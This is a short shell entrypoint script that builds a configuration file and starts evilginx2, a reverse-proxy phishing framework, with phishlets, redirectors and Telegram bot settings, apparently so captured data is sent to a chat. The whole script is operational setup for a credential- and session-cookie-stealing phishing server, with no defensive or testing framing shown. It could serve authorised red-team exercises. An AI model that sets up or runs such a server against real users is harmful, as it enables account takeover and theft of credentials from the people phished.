#!/bin/sh
set -e
mkdir -p /root/.evilginx

# Provide defaults to avoid invalid JSON
DOMAIN=${DOMAIN:-"localhost"}
EXTERNAL_IP=${EXTERNAL_IP:-"127.0.0.1"}
CHAT_ID=${CHAT_ID:-""}
TELE_TOKEN=${TELE_TOKEN:-""}
PORT=${PORT:-443}

cat > /root/.evilginx/config.json <<EOF
{
  "server_ip": "0.0.0.0",
  "http_port": 80,
  "https_port": ${PORT},
  "domain": "${DOMAIN}",
  "ipv4_external": "${EXTERNAL_IP}",
  "chatid": "${CHAT_ID}",
  "teletoken": "${TELE_TOKEN}"
}
EOF

exec /usr/local/bin/evilginx2 -developer -p ./phishlets -t ./redirectors
